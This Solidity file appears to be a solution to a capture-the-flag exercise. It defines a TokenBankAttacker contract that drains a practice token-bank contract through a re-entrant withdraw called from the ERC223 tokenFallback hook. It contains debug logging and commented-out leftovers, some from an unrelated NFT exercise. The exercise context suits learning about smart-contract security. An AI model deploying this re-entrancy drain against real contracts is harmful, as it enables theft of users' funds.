// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {console, Test} from "@forge-std/Test.sol";


import { SimpleERC223Token} from "@main/miscellaneous/TokenBank.sol";


interface IChallenge{

    function token() external view returns (SimpleERC223Token);

    function balanceOf(address account) external view returns (uint256);

    function withdraw(uint256 amount) external;

}

interface IERC223Token{

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(address from, address to, uint256 value)
        external
        returns (bool success);

    function transfer(address to, uint256 value) external returns (bool);

}

// `attacker` withdraw token from TokenBankChallenge
// `attacker` deposit to `TokenBankAttacker`
// `TokenBankAttacker` transfer to TokenBankChallenge
// `TokenBankAttacker` withdraw from TokenBankChallenge -> re-entrancy

contract TokenBankAttacker {

    IChallenge challenge;
    IERC223Token token;
    uint256 trackedAmount;
    
    constructor(address _challenge, address _token) payable {
        challenge = IChallenge(_challenge);
        token = IERC223Token(_token);
    }

    function attack () external {

        bool success = token.transferFrom(msg.sender, address(this),500000 ether );

        require(success, "transfer is success");

        require( token.balanceOf(address(this)) == 500000 ether, "attacker must transfer the token to first");
        require( token.balanceOf(address(challenge)) == 500000 ether, "challenge should have half ");
        require( challenge.balanceOf(address(this)) == 0 ether, "attacker must transfer the token first");

        token.transfer(address(challenge),500000 ether );

        require( token.balanceOf(address(challenge)) == 1000000 ether, "TokenBankAttacker must transfer the token ");
        require( challenge.balanceOf(address(this)) == 500000 ether, "TokenBankAttacker must deposit the token first");

        trackedAmount = challenge.balanceOf(address(this));
        trackedAmount -= 500000 ether;

        challenge.withdraw(500000 ether);
    }

    function tokenFallback(address from, uint256 value, bytes calldata) external {

        if (from != address(challenge)) return;

        // uint256 trackedAmount = challenge.balanceOf(address(this);

        // this is not updated even after attacked
        uint256 balanceBeforeWithdraw = challenge.balanceOf(address(this));
        uint256 amountLeft = token.balanceOf(address(challenge));


        if(amountLeft > 0) {
        // if(trackedAmount >= 0) {

            console.log('challenge.balanceOf(address(this))');
            console.log(challenge.balanceOf(address(this)));

            console.log('Fallback(before) trackedAmount');
            console.log(trackedAmount);

            console.log('amountLeft');
            console.log(amountLeft);

            // trackedAmount -= 500000 ether;

            // console.log('Fallback(Aftere) trackedAmount');
            // console.log(trackedAmount);

            // if( trackedAmount == 0) return;
            // else trackedAmount -= 500000 ether;

            

            uint256 amountToWithdraw = amountLeft < balanceBeforeWithdraw
                ? balanceBeforeWithdraw
                : amountLeft;

            challenge.withdraw(amountToWithdraw);

            // if (amountLeft == 0) return;

            // if (amountLeft >= 500000 ether) challenge.withdraw(500000 ether);
            // else challenge.withdraw(amountLeft);

            
            

            // challenge.withdraw(500000 ether);


        }


        // if(overmint1.balanceOf(attacker) < 5) {

        //     overmint1.transferFrom(address(this), attacker, tokenId);
        //     overmint1.mint();
        //     if (overmint1.balanceOf(attacker) == 5) return this.onERC721Received.selector;
        // }
        // return this.onERC721Received.selector;

    }
    
}